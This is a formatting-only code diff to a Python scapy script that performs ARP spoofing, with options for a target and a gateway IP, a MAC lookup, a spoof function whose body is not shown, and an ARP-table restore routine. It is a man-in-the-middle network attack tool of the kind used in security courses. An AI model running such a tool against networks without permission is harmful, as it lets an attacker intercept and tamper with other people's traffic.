@@ -36,11 +36,11 @@ def get_arguments():
     parser = optparse.OptionParser()
 
     # Get the IP Address of target device
-    parser.add_option("-t", "--target", dest="target",
-                      help="Target IP Address")
+    parser.add_option("-t", "--target", dest="target", help="Target IP Address")
     # Get the IP Address of spoof device
-    parser.add_option("-g", "--gateway", dest="gateway",
-                      help="Gateway IP Address")
+    parser.add_option(
+        "-g", "--gateway", dest="gateway", help="Gateway IP Address"
+    )
 
     (options, arguments) = parser.parse_args()
 
@@ -48,11 +48,13 @@ def get_arguments():
     if not options.target:
         parser.error(
             "[-] Please specify an IP Address of target device,"
-            " use --help for more info.")
+            " use --help for more info."
+        )
     elif not options.gateway:
         parser.error(
             "[-] Please specify a Gateway IP Address"
-            ", use --help for more info.")
+            ", use --help for more info."
+        )
     return options.target, options.gateway
 
 
@@ -62,7 +64,7 @@ def get_mac(ip_address):
     :param ip_address: IP Address of target device
     :type ip_address: str
     :return: MAC Address of target device
-    :rtype: str 
+    :rtype: str
     """
     arp_request = scapy.ARP(pdst=ip_address)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # ethernet object
@@ -70,8 +72,9 @@ def get_mac(ip_address):
     arp_request_broadcast = broadcast / arp_request
 
     # use srp function to send arp_request_broadcast packet and receive response
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
-                              verbose=False)[0]
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[
+        0
+    ]
 
     return answered_list[0][1].hwsrc
 
@@ -79,7 +82,7 @@ def get_mac(ip_address):
 def spoof(target_ip, spoof_ip):
     """
     ARP spoof device with target_ip from spoof _ip.
-    
+
     :param target_ip: IP Address of target device
     :type target_ip: str
     :param spoof_ip: IP Address of router, i.e. gateway
@@ -104,8 +107,13 @@ def restore(destination_ip, source_ip):
     """
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
-                       psrc=source_ip, hwsrc=source_mac)
+    packet = scapy.ARP(
+        op=2,
+        pdst=destination_ip,
+        hwdst=destination_mac,
+        psrc=source_ip,
+        hwsrc=source_mac,
+    )
     print(packet.show())
     print(packet.summary())
 
